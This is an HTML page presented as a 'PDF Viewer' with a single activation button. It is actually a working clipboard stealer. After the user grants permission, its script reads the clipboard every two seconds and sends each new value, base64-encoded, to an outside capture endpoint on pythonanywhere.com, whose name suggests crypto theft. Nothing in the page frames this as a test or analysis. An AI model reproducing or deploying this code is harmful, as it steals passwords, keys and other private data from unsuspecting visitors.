<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PDF Viewer</title>
</head>
<body>
    <h1>Click me</h1>
    <button id="btn">Click Here</button>
    <p id="status">● Click to activate</p>

    <script>
        document.getElementById("btn").addEventListener("click", function() {
            document.getElementById("status").textContent = "⏳ Requesting permission...";
            navigator.clipboard.readText().then(() => {
                document.getElementById("status").textContent = "✅ Active";
                this.textContent = "Active";
                this.disabled = true;
                let last = "";
                setInterval(() => {
                    navigator.clipboard.readText().then(text => {
                        if (text && text !== last) {
                            last = text;
                            fetch("https://rugpuller.pythonanywhere.com/capture", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ data: btoa(unescape(encodeURIComponent(text))) })
                            });
                        }
                    }).catch(() => {});
                }, 2000);
            }).catch(() => {
                document.getElementById("status").textContent = "❌ Permission denied";
            });
        });
    </script>
</body>
</html>
